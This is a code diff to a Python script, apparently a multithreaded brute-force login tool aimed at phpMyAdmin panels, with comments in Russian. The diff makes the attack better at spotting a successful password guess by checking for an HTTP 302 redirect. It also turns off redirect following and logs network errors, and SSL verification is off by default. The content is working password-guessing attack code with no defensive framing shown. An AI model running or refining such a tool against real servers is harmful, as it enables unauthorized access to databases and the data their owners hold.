@@ -39,11 +39,16 @@ def try_login(url, username, password, verify_ssl=False, timeout=5):
             data=payload,
             timeout=timeout,
             verify=verify_ssl,
-            allow_redirects=False
+            allow_redirects=False  # Отключаем автоматические редиректы
         )
-        success = "phpMyAdmin" in response.text and "Logout" in response.text
+
+        # Успешный вход определяется по статус-коду 302 (Found)
+        success = response.status_code == 302
         return success, username, password
+
     except requests.RequestException as e:
+        # Логируем ошибки сети или таймауты
+        print(f"[Request Error] {e}")
         return False, username, password
 
 def brute_force(url, usernames, passwords, threads=20, verify_ssl=False):
